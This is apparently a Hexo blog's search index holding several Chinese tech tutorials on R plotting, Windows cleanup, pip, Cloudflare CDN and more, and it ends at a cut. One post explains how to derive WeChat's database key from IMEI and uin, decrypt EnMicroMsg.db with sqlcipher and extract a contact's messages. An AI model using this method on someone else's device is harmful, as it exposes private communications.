<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Hexo博客展示GitHub Chart]]></title>
    <url>%2Farchives%2F90b9ba07.html</url>
    <content type="text"><![CDATA[本文主要介绍如何在个人博客中展示GitHub Chart。其实GitHub上已经有人开源了一个工具，并且提供了API，我们只需要调用一下就可以了。工具地址：Github Chart API这个工具可以实时的将GitHub Chart信息转化成一张图片，如下图所示，然后我们就可以把它插入到自己的博客进行展示了。使用方法我们只需要在https://ghchart.rshah.org/这个地址后加上自己的GitHub用户名即可构造GitHub Chart图片的URL。例如：1https://ghchart.rshah.org/dta0502HTML引入图片1&lt;img src="http://ghchart.rshah.org/dta0502" alt="dta0502's Github chart" /&gt;Markdown引入图片1![dta0502's Github chart](https://ghchart.rshah.org/dta0502)自定义颜色这个工具还支持自定义配色方案，我们可以提供任何基本颜色来为图表添加阴影。我们只需访问https://ghchart.rshah.org/&lt;HEX-COLOR&gt;/2016rshah，然后将&lt;HEX-COLOR&gt;替换为我们想要设置的十六进制颜色代码（不包括开头的标签）就可以了。例如，如果我们想要一个的蓝色主题图表（＃409ba5），那么我们可以构造链接：1&lt;img src="http://ghchart.rshah.org/409ba5/dta0502" alt="dta0502's Blue Github Chart" /&gt;参考Github Chart API在博客中展示 GitHub Chart]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Chart</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ggplot2柱状图按数值大小排序]]></title>
    <url>%2Farchives%2Fc363755b.html</url>
    <content type="text"><![CDATA[ggplot2柱状图按照数值大小进行排序是比较困难的。这是因为ggplot2考虑的是因子级别的顺序，而不是数据框中观察到的顺序。我们可以使用sort()或arrange()对输入数据框进行排序，但是这不会对ggplot2输出产生任何影响（柱状图依旧按照因子的顺序排列）。本文主要介绍如何让ggplot2的柱状图按照数值大小排序。本文用到的数据集数据集1——自己定义的：1234data &lt;- data.frame( name = c("north","south","south-east","north-west","south-west","north-east","west","east"), val=sample(seq(1,10), 8))数据集2——ggplot2包自带的mpg数据集。forecats包实现forecats库是tidyverse中的一个库，专门用于处理R中的因子，它提供了一组有用的工具来解决因子的常见问题。其中fact_reorder()函数允许通过另一列data$val的值对因子data$name进行重新排序。123456789101112131415161718192021library(ggplot2)library(dplyr)library(forcats)# 通过另一列的值来对因子重新排序（升序）data %&gt;% mutate(name = fct_reorder(name, val)) %&gt;% ggplot(aes(x=name, y=val)) + geom_bar(stat="identity", fill="#f68060", alpha=.6, width=.4) + coord_flip() + xlab("") + theme_bw() # 通过另一列的值来对因子重新排序（降序）data %&gt;% mutate(name = fct_reorder(name, desc(val))) %&gt;% ggplot(aes(x=name, y=val)) + geom_bar(stat="identity", fill="#f68060", alpha=.6, width=.4) + coord_flip() + xlab("") + theme_bw()我们可以指定用哪个函数.fun来确定顺序。默认值是使用中位数，我们也可以使用每组的数据点数来排序：1234567891011121314151617# 中位数（默认）mpg %&gt;% mutate(class = fct_reorder(class, hwy, .fun='median')) %&gt;% ggplot(aes(x=class, y=hwy, fill=class)) + geom_boxplot() + xlab("class") + theme(legend.position="none") + xlab("")# 数据点数mpg %&gt;% mutate(class = fct_reorder(class, hwy, .fun='length')) %&gt;% ggplot(aes(x=class, y=hwy, fill=class)) + geom_boxplot() + xlab("class") + theme(legend.position="none") + xlab("")当然我们也可以自己指定因子的顺序：12345678data %&gt;% mutate(name = fct_relevel(name, "north", "north-east", "east", "south-east", "south", "south-west", "west", "north-west")) %&gt;% ggplot( aes(x=name, y=val)) + geom_bar(stat="identity") + xlab("")dplyr包实现dplyr的mutate()函数允许创建新变量或修改现有变量，我们可以用它来重新创建具有特定顺序的因子。下面是两个例子：采用arrange()对数据框进行排序，然后按照这个顺序对因子进行重新排序。自定义因子顺序。12345678910111213141516171819202122# 利用arrange()对数据框排序，然后按照这个顺序对因子进行重新排序data %&gt;% # 按照val进行排序，但是这只对数据框进行了排序而没有对因子进行排序 arrange(val) %&gt;% # 通过下面这个小技巧可以直接更新因子 mutate(name=factor(name, levels=name)) %&gt;% ggplot(aes(x=name, y=val)) + geom_segment(aes(xend=name, yend=0)) + geom_point(size=4, color="orange") + coord_flip() + theme_bw() + xlab("")# 自定义因子顺序data %&gt;% arrange(val) %&gt;% mutate(name = factor(name, levels=c("north", "north-east", "east", "south-east", "south", "south-west", "west", "north-west"))) %&gt;% ggplot(aes(x=name, y=val)) + geom_segment(aes(xend=name, yend=0)) + geom_point(size=4, color="orange") + theme_bw() + xlab("")base包的reorder()函数实现reorder()函数用法：1reorder(x, X, FUN = mean, ..., order = is.ordered(x))x：因子型向量X：用来排序的数值型向量FUN：汇总数据的函数...：FUN的参数（可选）order：我们可以通过这个参数直接指定因子型向量的顺序按照x对X进行分组，对每一组组成的向量计算后面的函数，最后根据计算结果从小到大指定x中元素的顺序。下面是一个例子：12345678mpg$class = with(mpg, reorder(class, hwy, median))p &lt;- mpg %&gt;% ggplot( aes(x=class, y=hwy, fill=class)) + geom_violin() + xlab("class") + theme(legend.position="none") + xlab("")参考Reorder a variable with ggplot2Reorder Levels of a Factor]]></content>
      <categories>
        <category>R</category>
        <category>数据可视化</category>
      </categories>
      <tags>
        <tag>R</tag>
        <tag>数据可视化</tag>
        <tag>ggplot2</tag>
        <tag>柱状图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win10清理C盘方法]]></title>
    <url>%2Farchives%2Fdf0b3807.html</url>
    <content type="text"><![CDATA[本文主要介绍了几个Win10系统C盘空间清理的小技巧。清理Windows日志文件系统使用时间长的，日志文件甚至会超过数G。我们可以通过计算机管理—事件查看器—Windows日志—系统（右键）--清除日志。索引文件转移索引文件来加快搜索速度的，电脑硬盘越大，安装的文件越多，索引文件越大。索引文件默认在C盘。默认的索引文件在C:\ProgramData\Microsoft\Search\Data\Applications\Windows文件夹下的Windows.edb文件。我们可以通过控制面板—索引选项—高级—索引设置—选择新位置来把索引文件转移到非系统盘：控制面板窗口中，我们需要点击右上角的“大图标”菜单项，这样就会打开Win10的所有控制面板项窗口，然后点击窗口中的“索引选项”图标： 选择新位置缩小休眠文件默认情况下，休眠文件或休眠文件（C:\hiberfil.sys）是Windows 10计算机上安装的RAM总量的75％。快速启动需要启用休眠模式。如果您只想使用快速启动而又不打算使用休眠功能，则可以将hiberfile类型指定为减小的类型，以将休眠文件的大小（hiberfil.sys）减小到其完整大小的一半。Hibernate文件有两种类型：完整-Full：完整的hiberfile类型可以启用休眠模式并打开快速启动（hiberboot）。它约占可用RAM总量的75％。默认大小是物理内存的40％。它支持休眠，混合睡眠，快速启动。精简-Reduced：这种类型的hiberfile无需休眠即可开启快速启动（hiberboot）。减少的文件类型将C:\hiberfil.sys的大小减小到其完整大小的大约50％。此命令将从电源菜单中删除休眠模式。默认大小是物理内存的20％。它支持快速启动。我们可以通过下面的命令（管理员身份运行cmd）来将Hiberfile类型指定为“精简”：1powercfg /h /type reduced注意：如果将休眠文件设置为大于40％的自定义大小，则命令将返回“参数错误”错误。 您必须先使用命令powercfg /h /size 0将文件的大小设置为零，然后重新运行休眠文件类型“ reduced”命令。12345C:\WINDOWS\system32&gt;powercfg /h /size 0 已将休眠文件大小设置为: 3320750080 字节。C:\WINDOWS\system32&gt;powercfg /h /type reduced 已将休眠文件大小设置为: 1660375040 字节。过期驱动文件清理Windows系统对于驱动文件，有这样的一个机制。系统会把第三方的驱动都放入到C:\Windows\System32\DriverStore目录中，当你安装新驱动的时候，新的驱动也会安装到这个目录。然而，用户安装新驱动的同时，系统并不会清理掉之前的老驱动，而是保留老驱动的文件，方便出问题的时候恢复。注意：直接删DriverStore目录的文件很容易出问题。其实Windows一直都有一个自带的命令行工具 pnputil.exe ，用这个可以列出DriverStore中的驱动，还可以删除，但是，命令行的工具比较难用，因而，我们可以用Driver Store Explorer来删除老驱动。Driver Store Explorer就是给pnputil做了个简单的图形界面。使用方法：用管理员权限启动后，右键点击不要的选择删除即可。正常情况下在用的驱动是无法删除的，当然，点击Force deletion除外。参考Win10清理系统盘空间实用攻略Windows快速启动背后的功臣：休眠如何在Win10中将Hiberfile类型指定为完全或精简]]></content>
      <categories>
        <category>工具使用</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信聊天记录解密并导出]]></title>
    <url>%2Farchives%2Fe872e04.html</url>
    <content type="text"><![CDATA[我们知道，微信的聊天记录是加密的，因而我们不能从文件中直接查看、导出。本文主要介绍如何把聊天记录解密、导出成SQL或csv文件。手机微信数据库导出方法1——某些手机无需root即可备份某些手机（比如某米、某为）通过官方的APP（无需root）即可把微信手机端的应用数据备份到电脑或者SD卡上。但是我在实际操作的时候碰到了困难，我用的是某为手机，在电脑端和手机端均安装了官方提供的手机助手软件以后，正准备备份微信这个应用的数据，竟然一定要我输入密码进行加密，备份数据加密后就无法进行后续的操作了。我只好放弃了这个办法。方法2——root如果你的手机已经root，那么你可以直接使用adb将/data/data/com.tencent.mm复制即可。/data/data/&lt;package_name&gt;目录是app的私有目录，本身可以访问，外部程序没有访问权限，一些不想让用户看到的文件可以放在这里。此目录在程序卸载后将被删除，对应的是设置中的“数据”一项，如果清空数据，这个目录将会被清空。app自身对此目录的读写不需要额外的权限。注意：没root过的手机是看不到这个目录的。考虑到安全因素，我没有选择这种方法。方法3——安卓模拟器我们可以在电脑上安装一款安卓模拟器，然后里面下载手机微信并登录，然后将手机端聊天记录备份到电脑端微信，再将电脑端聊天记录恢复到安卓虚拟器里的微信。现在对安卓虚拟器进行root，然后我就可以进入/data/data/&lt;package_name&gt;目录，从而把数据库复制到电脑上了。下面我简单讲一下整个步骤：我选择了蓝叠这个安卓模拟器。首先在模拟器上下载了微信APP，然后我把自己手机微信上的聊天数据备份到电脑微信中，然后退出手机微信，在模拟器上登录微信，再把数据恢复到模拟器上的微信中。在模拟器右上角的设置中打开root权限。打开文件浏览器，找到数据库文件，它在/data/data/com.tencent.mm/MicroMsg/[weixin_name]/EnMicroMsg.db。其中文件夹 [weixin_name] 的名字为32位的md5值，如 85794836981744a4472f69d89aeb2152，一个微信号对应一个文件夹。如果有多个 [weixin_name]，那么此微信肯定登录过多个微信号。把数据库文件拷贝到/sdcard/windows/BstSharedFolder这个共享文件夹中，这个文件夹在Windows上就是BluestacksCN/Engine/ProgramData/Engine/UserData/SharedFolder，当我们在模拟器中拷贝完数据后，在Windows上就能看到了。注意：数据是互通的。破解数据库密码根据前人的分析，微信数据库 EnMicroMsg.db 的密码是由 MD5(IMEI + uin).substring(0, 7) 生成的。因此，我们需要找到IMEI和uin值。IMEI方法1我通过在模拟器上安装这个工具：Find IMEI来查看IMEI。下载apk，然后把apk放入到BluestacksCN/Engine/ProgramData/Engine/UserData/SharedFolder这个文件夹中，我们就可以在模拟器的/sdcard/windows/BstSharedFolder文件夹中找到了，然后直接安装，打开就直接显示出IMEI了。方法2我们也可以在/data/data/com.tencent.mm/shared_prefs/DENGTA_META.xml中查找名为 IMEI_DENGTA 的值。uinuin（unique identifier）是唯一标识符（整数类型），微信分配每个用户的唯一标识符，它具有不可重复性，也就是说这个世界上没有两个 uin 相同的微信号。方法1我们可以在/data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml找到default_uin，后面的数字就是我们要找的uin了。方法2我们也可以登录 web 微信，按 F12 打开网页调试工具，然后 ctrl+F 搜索 uin，可以找到一串长长的 URL，里面的 uin 就是当前登录的微信的 uin。计算密码注意：IMEI中的字母必须为大写MD5中的字母必须为小写我们可以使用：MD5在线计算来计算MD5值，密码即为32位的前7位（小写）。查看数据库微信使用了sqlcipher加密了数据库，因此，我们也可以使用sqlcipher进行解密。SQLCipher是一个在SQLite基础之上进行扩展的开源数据库，它主要是在SQLite的基础之上增加了数据加密功能，如果我们在项目中使用它来存储数据的话，就可以大大提高程序的安全性。Windows下打开Windows用户可以直接使用 sqlcipher.exe 打开 com.tencent.mm/MicroMsg/[weixin_name]/EnMicroMsg.db，在弹出的窗口输入刚刚生成的7位密码。sqlcipher.exe其实是SQLite Database Browser软件再嵌套了解密功能。注意：sqlcipher不同版本使用的加密方式不同，如果解密用sqlcipher版本和加密用的sqlcipher版本不一样，会提示file is not a database，实际错误是解密失败。目前发现2.1版本的sqlcipher可以正常解密。然后我们可以在 Browse Data 菜单栏处查看数据中各个数据表。我们可以点击菜单栏的File-Export-Table as CSV file，选择message表，导出成csv文件。如果直接用Excel打开这个表格，可能会显示乱码。所以我们新建一个Excel表格，点击数据-来自文本，然后导入这个.csv文件。在弹出的第一个下拉框中选择GB2312，然后载入就不会出现乱码。Ubuntu下打开安装sqlicipher：12sudo apt-get updatesudo apt-get install sqlcipher解密数据库文件，这里我们要输入前面得到的密码：1sqlcipher EnMicroMsg.db 'PRAGMA key = "yourkey"; PRAGMA cipher_use_hmac = off; PRAGMA kdf_iter = 4000; ATTACH DATABASE "decrypted_database.db" AS decrypted_database KEY "";SELECT sqlcipher_export("decrypted_database");DETACH DATABASE decrypted_database;'然后我们就得到了解密的数据库decrypted_database.db，我们可以用自己熟悉的数据库软件打开。了解数据表我们主要使用以下三个表：rcontact：通讯录表chatroom：群聊表message：聊天记录表微信文字聊天记录在数据表message中。我们可以根据talker这个字段来筛选出特定用户的聊天记录。如果为群聊，那么message.talker = chatroom.chatroomname。message.content中存储形式为：群成员wxid:\n内容。比如，我们可以查询与某人的聊天记录，下面是SQL语句：123456789select datetime(subStr(cast(m.createTime as text),1,10),'unixepoch', 'localtime') as theTime,case m.isSend when 0 then r.nickname when 1 then '我'end as person, m.content from message m inner join rcontact r on m.talker = r.username where m.type = 1 and r.nickname = '对方微信昵称'order by theTime;参考免root提取微信聊天记录数据库手机微信聊天记录的解密与恢复微信聊天记录导出为电脑txt文件教程]]></content>
      <categories>
        <category>工具使用</category>
        <category>软件</category>
      </categories>
      <tags>
        <tag>微信</tag>
        <tag>sqlcipher</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python requests在HTTP2.0下的问题]]></title>
    <url>%2Farchives%2F9bd92731.html</url>
    <content type="text"><![CDATA[今天在用Python中的requests包爬数据时，发现了一个很特殊的请求头，其中有:authority、:method、:path、:scheme这几个参数，这些参数说明这个网站用了HTTP2.0。然后我发现我们不能用requests包直接构造请求头进行爬取了。本文简单分析并解决这个问题。HTTP2.0：请求/响应首部的定义基本没有改变，只是所有首部键必须全部小写，而且请求行要独立为:method、:scheme、:host、:path这些键值对。如果我们按照以前的设置构造headers进行爬取：123456789101112131415url = "https://xxxxxx.com/tag/xxxx/page/1.html"headers = &#123;':authority': 'xxxxxx.com', ':method': 'GET', ':path': '/tag/xxxx/page/1', ':scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8', 'Sec-Fetch-Mode':'navigate', 'Sec-Fetch-Site':'none', 'Sec-Fetch-User':'?1', 'Upgrade-Insecure-Requests':'1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'&#125;requests.get(url = url, headers = headers)会报出以下错误：1ValueError: Invalid header name b&apos;:authority&apos;这是因为HTTP的请求头不能以分号开头。源码不能解析这样的请求头，具体可以见源码。我们可以使用hyper这个第三方包来解决这个问题，我们将代码改写为：12345678910111213141516171819from hyper.contrib import HTTP20Adapterurl = "https://xxxxxx.com/tag/xxxx/page/1.html"headers = &#123;':authority': 'xxxxxx.com', ':method': 'GET', ':path': '/tag/xxxx/page/1', ':scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8', 'Sec-Fetch-Mode':'navigate', 'Sec-Fetch-Site':'none', 'Sec-Fetch-User':'?1', 'Upgrade-Insecure-Requests':'1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36'&#125;sessions = requests.session()sessions.mount('https://xxxx.com', HTTP20Adapter())response = sessions.get(url = url,headers = headers)OK，问题解决！参考HTTP headers - Requests - PythonPython 请求头header在http/http2下的问题]]></content>
      <categories>
        <category>爬虫</category>
        <category>问题</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu内置的Python3.5安装pip模块]]></title>
    <url>%2Farchives%2F399c2726.html</url>
    <content type="text"><![CDATA[本文首先介绍了如何给Ubuntu16.04内置的Python3.5安装pip模块，然后扩展介绍了多版本Python安装对应pip以及对pip对应Python版本进行管理的方法。问题描述当我想通过Ubuntu16.04内置的Python3.5的pip安装第三方包时，出现如下错误：12root@VPS:/home# python3 -m pip install numpy/usr/bin/python3: No module named pip问题分析从错误描述来看，pip包不存在。我们知道：Debian软件管理器（sudo apt-get install）安装的package存放在 /usr/lib/python2.7/dist-packages目录中Python软件管理器（easy_install和pip）安装的package存放在/usr/local/lib/python2.7/dist-packages目录中手动从源代码安装的package会直接使用目录site-packages然后我进入到以下目录，看下是否存在pip文件夹：12345root@VPS:/home# cd /usr/local/lib/python3.5/dist-packages/root@VPS:/usr/local/lib/python3.5/dist-packages# lltotal 8drwxrwsr-x 2 root staff 4096 Nov 14 08:10 ./drwxrwsr-x 3 root staff 4096 Nov 14 08:10 ../发现当前目录是空的，并没有pip，说明并没有装上pip，因此，我们需要手动安装pip：12wget https://bootstrap.pypa.io/get-pip.pysudo python3.5 get-pip.py注意：这里的Python3.5根据你Python的版本进行替换。然后查看一下是否安装成功：1pip -V显示下面说明安装成功。1pip 19.3.1 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)然后我们就可以使用pip来安装别的包了：1python3 -m pip install XXXpip版本管理首先我通过上面的方法安装了Python2.7的pip，此时查看：12345root@VPS:/usr/local/lib/python2.7/dist-packages# pip -Vpip 19.3.1 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)root@VPS:/usr/local/lib/python2.7/dist-packages# pip2 -Vpip 19.3.1 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)然后我用同样的方法安装了Python3.5的pip，此时查看：12345678root@VPS:/usr/local/lib/python3.5/dist-packages# pip -Vpip 19.3.1 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)root@VPS:/usr/local/lib/python3.5/dist-packages# pip3 -Vpip 19.3.1 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)root@VPS:/usr/local/lib/python3.5/dist-packages# pip3.5 -Vpip 19.3.1 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)然后我用同样的方法安装了Python3.6的pip，此时查看：1234567891011root@VPS:/usr/local/lib/python3.6/dist-packages# pip -Vpip 19.3.1 from /usr/local/lib/python3.6/dist-packages/pip (python 3.6)root@VPS:/usr/local/lib/python3.6/dist-packages# pip3 -Vpip 19.3.1 from /usr/local/lib/python3.6/dist-packages/pip (python 3.6)root@VPS:/usr/local/lib/python3.6/dist-packages# pip3.5 -Vpip 19.3.1 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)root@VPS:/usr/local/lib/python3.6/dist-packages# pip3.6 -Vpip 19.3.1 from /usr/local/lib/python3.6/dist-packages/pip (python 3.6)我们发现，每次安装pip，它都会把默认pip对应的Python修改，导致pip对应版本混乱。现在系统中安装了Python2.7、Python3.5、Python3.6。各个pip对应的Python版本如下：pip对应Python3.6pip2对应Python2.7pip3对应Python3.6pip3.5对应Python3.5pip3.6对应Python3.6现在我们想要让pip对应Python2.7，让pip3对应Python3.5。然后我们进入到/usr/local/bin，发现里面有很多pip：12345678910111213141516root@VPS:/usr/local/lib/python3.6/dist-packages# cd /usr/local/bin/root@VPS:/usr/local/bin# lltotal 52drwxr-xr-x 2 root root 4096 Dec 15 03:37 ./drwxr-xr-x 10 root root 4096 Nov 14 08:09 ../-rwxr-xr-x 1 root root 232 Dec 15 03:37 easy_install*-rwxr-xr-x 1 root root 232 Dec 15 03:19 easy_install-2.7*-rwxr-xr-x 1 root root 232 Dec 15 03:20 easy_install-3.5*-rwxr-xr-x 1 root root 232 Dec 15 03:37 easy_install-3.6*-rwxr-xr-x 1 root root 219 Dec 15 03:37 pip*-rwxr-xr-x 1 root root 219 Dec 15 03:19 pip2*-rwxr-xr-x 1 root root 219 Dec 15 03:19 pip2.7*-rwxr-xr-x 1 root root 219 Dec 15 03:37 pip3*-rwxr-xr-x 1 root root 219 Dec 15 03:20 pip3.5*-rwxr-xr-x 1 root root 219 Dec 15 03:37 pip3.6*-rwxr-xr-x 1 root root 210 Dec 15 03:37 wheel*这些pip文件其实是Python脚本文件，我们可以用vim打开pip：12345678#!/usr/bin/python3.6# -*- coding: utf-8 -*-import reimport sysfrom pip._internal.main import mainif __name__ == '__main__': sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0]) sys.exit(main())这个文件的第一行指定了这个脚本对应的Python版本，如果想把pip对应的Python版本改为2.7的，只需修改Python3.6为Python2.7即可。修改保存后执行：12root@VPS:/usr/local/bin# pip -Vpip 19.3.1 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)我们已经成功的把pip对应的Python版本改为了2.7，同理也可以修改pip3对应的版本。注意：不同版本的pip对应的这个脚本文件的内容不同，上面显示的是pip 19.3.1版本的，其它版本的脚本文件内容可能与之不同。直接改这个脚本文件来修改pip对应的Python版本的前提是：当前脚本文件对应的Python版本与要修改对应的Python版本的pip包版本最好一致，不一致很可能出错。最简单的解决办法是都升级为最新的pip版本。参考What’s the difference between dist-packages and site-packages?多版本Python安装pip及pip版本管理终极教程]]></content>
      <categories>
        <category>Python</category>
        <category>pip</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>pip</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo配置Cloudflare免费CDN]]></title>
    <url>%2Farchives%2F12c6c559.html</url>
    <content type="text"><![CDATA[由于 GitHub Pages 的服务器在国外，国内访问速度可能会非常慢。目前有以下几种解决方案：博客双线部署在GitHub Pages和Coding Pages上，其中国内流量解析到Coding Pages，国外流量解析到GitHub Pages优势：无需购买VPS、速度比较快、不用备案劣势：Coding Pages的服务并不是那么稳定，近期出现多次不能正常部署或访问Pages的问题博客部署到国内的VPS优势：速度快劣势：需要购买VPS、需要备案博客部署在GitHub Pages上并采用CDN加速优势：速度快、无需备案、稳定劣势：CDN比较贵，hhh本文主要介绍Hexo博客部署在GitHub Pages上并且配置CDN进行加速的方法。这里我们假设博客已经部署在GitHub Pages并启用了个性域名。如果你还没有绑定个性域名，可以参考这篇教程：GitHub Pages 绑定域名，其中域名服务器修改到DNSPod这部分可以不看，因为这里我们会用Cloudflare来完成域名解析。CDN介绍内容分发网络（Content delivery network或Content distribution network，缩写：CDN）是指一种透过互联网互相连接的计算机网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、影片、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。简单来说，CDN 就是部署在世界各地的缓存服务器，它们会提前缓存网站上的资源，然后当用户想要访问相关资源时，直接从 CDN 服务器上取就可以了。这样不仅可以增加访问速度减少访问延迟，还可以减缓网站服务器上的压力。为什么选择Cloudflare？国内的CDN服务提供商有不少，但是基本都需要备案，因此我转向了Cloudflare这个国外的CDN服务提供商。Cloudflare 是全球最大的 DNS 服务提供商之一。除此之外他们还提供CDN、SSL证书、DDos保护等服务，并且 Cloudflare 与百度有合作，在国内也部署有大量的节点，还能顺便解决百度爬无法抓取 GitHub Pages 的问题。CDN配置快速开始首先要去 Cloudflare 注册一个帐号。注意：我们需要的是国际版的 CloudFlare，而不是 CloudFlare 与百度合作的百度云加速。注册好后点击 Add site 添加你的网站个性化域名。添加好后选择免费的那个计划（Plan），有钱也可以选择收费的，提供的服务更多。然后点击 Scan DNS Records，等待扫描完成。即使没有扫到 DNS 记录也没有关系，我们可以在后面自己添加，我们只需要添加下图框起来的那两条：然后 Cloudflare 会要你把你的 DNS 服务器替换成他提供的，我们只需要去域名商那里设置一下即可。CloudFlare 既是一个 CDN 服务商，同样也是一个 DNS 服务商。DNS修改完成后可以点击 Recheck Nameservers 来复查 NS 记录是否正确设置。然后过个几分钟，显示 Great news! Cloudflare is now protecting your site 就说明设置成功。Cloudflare设置详解Overview菜单设置主要关注下面两个快捷设置：under attack mode：当你的网站被攻击的时候打开它，这样可以阻止攻击。development mode：由于cloudflare采用了缓存技术，当你更新了网站的内容，不一定能马上在前台看到更新的内容。这个时候你只要打开development mode就可以马上看到网站更新的内容。当然，正常情况下还是关掉比较好。Analytics菜单设置这里主要是看网站使用cloudflare之后的一些分析数据，Analytics下面包含几个子菜单：Traffic、security、Performance、DNS。Traffic子菜单：主要是网站在过去某一个时间段的请求、带宽、访客情况。Security子菜单：主要是某一段时间内受到的威胁数据，包括威胁次数、来自哪些国家、威胁的类型等等。Performance子菜单：付费功能。DNS子菜单：主要是DNS查询的数据。DNS菜单设置在DNS菜单里面，你可以随意添加或删除所有DNS记录，也可以选择使用或不使用cloudflare的CDN服务。注意：只有A记录和CNAME记录才可以设置使用CDN服务，我们只需要点亮Proxy status处的云彩小图标即可切换成使用CDN的状态。SSL/TLS菜单设置这里面主要是网站加密的设置。SSL设置：如果你本来的网站有SSL证书，这里选择full即可，即浏览器到Cloudflare和Cloudflare到服务器都是加密的。Always Use HTTPS设置：这个打开，一直使用https链接。Authenticated Origin Pulls &amp; Opportunistic Encryption &amp; Onion Routing设置：这些设置都打开Minimum TLS Version设置：选择1.1即可，如果选择太高可能导致网站打不开。Firewall菜单设置Firewall菜单里面可以对网站安全进一步设置，限制某些IP或地区的用户访问等。Events子菜单：这里面可以查看防火墙的一些小事件，比如屏蔽的一些访问。Managed Rules子菜单：付费功能。Firewall Rules子菜单：这里可以设置限制其他人访问你的网站的规则，每个账户只能设置5个限制规则。TOOLS子菜单：这里的功能是firewall rules功能的补充，都是对用户访问你的网站的一些设置。IP Access Rules：主要是针对IP、IP范围及国家和ASN设置一些规则。User Agent Blocking：对用户使用的代理设置规则，比如浏览器类型、CPU、操作系统。Settting子菜单：Security Level：这个设置low即可，如果设置太高，就会过于敏感，导致很多用户受影响。Challenge Passage：这是验证的有效期，可以设置久一点，比如1 hour。Browser Integrity Check 和 Privacy Pass Support：全部打开。Speed菜单设置Auto Minify：网页最小化处理，把Javascript, css html前面都打勾即可。Brotli：这是一种比gzip更好的网页压缩方式，打开即可。Rocket Loader：这个需要测试决定是否需要打开，没有固定的答案，你可以打开之后，然后在不同的浏览器上面查看网页的效果，如果出现网页排版等问题，那就将它关闭。Caching菜单设置Purge Cache：这个设置是清除缓存，其中：Custom Purge：清除指定页面的缓存，我们可以点击custom purge, 然后在框里面输入要清除的链接，再点击purge即可。Purge Everything：清除整个网站的缓存。Caching Level：缓存水平设置，决定缓存哪些内容，这里选择standard即可。Browser Cache TTL：即浏览器缓存过期时间，决定浏览器多久向网站获取一次新缓存。Page Rules菜单设置免费版本可以设置3个页面的规则。这里我们可以设置forwarding，也就是301跳转，比如我想要让tding.me整个站都跳转到tding.top，具体设置如下图：注意：如果Forwarding URL设置为https://tding.top，当我们访问tding.me/about.html时会跳转到https://tding.top而不是我们期望的https://tding.top/about.html。解决办法就是使用变量，每个通配符对应于可在转发地址中引用的变量。变量用 $ 后跟一个数字表示，如果要引用第一个通配符，我们可以使用 $1，如果要引用第二个通配符，我们可以使用 $2，依此类推。因此，Forwarding URL应该设置成https://tding.top/$1。测速下面是Cloudflare CDN加速后（左图）于GitHub Pages本身（右图）的速度对比：参考为博客添加免费的 CDN (Cloudflare)如何用CDN加速你的网站 – Cloudflare免费版详细使用教程]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Pages</tag>
        <tag>CDN</tag>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[R数据可视化-相关矩阵热力图]]></title>
    <url>%2Farchives%2F7fa1138e.html</url>
    <content type="text"><![CDATA[在数据分析时，我们经常需要看变量之间的相关性，一般采用相关矩阵热力图进行可视化，而ggplot2本身不能直接绘制热图，因此我们需要做数据变换把相关矩阵转换为一个3列的数据框（变量名Var1、变量名Var2、数值value），然后再分别映射给x、y和fill参数，绘制出热力图。数据准备这里我用的是ggplot2内置的mtcars数据集：12df &lt;- mtcars[, c(1,3,4,5,6,7)]head(df)这个数据前6行为：1234567 mpg disp hp drat wt qsecMazda RX4 21.0 160 110 3.90 2.620 16.46Mazda RX4 Wag 21.0 160 110 3.90 2.875 17.02Datsun 710 22.8 108 93 3.85 2.320 18.61Hornet 4 Drive 21.4 258 110 3.08 3.215 19.44Hornet Sportabout 18.7 360 175 3.15 3.440 17.02Valiant 18.1 225 105 2.76 3.460 20.22然后计算相关矩阵：1round(cor(df), 2)1234567 mpg disp hp drat wt qsecmpg 1.00 -0.85 -0.78 0.68 -0.87 0.42disp -0.85 1.00 0.79 -0.71 0.89 -0.43hp -0.78 0.79 1.00 -0.45 0.66 -0.71drat 0.68 -0.71 -0.45 1.00 -0.71 0.09wt -0.87 0.89 0.66 -0.71 1.00 -0.17qsec 0.42 -0.43 -0.71 0.09 -0.17 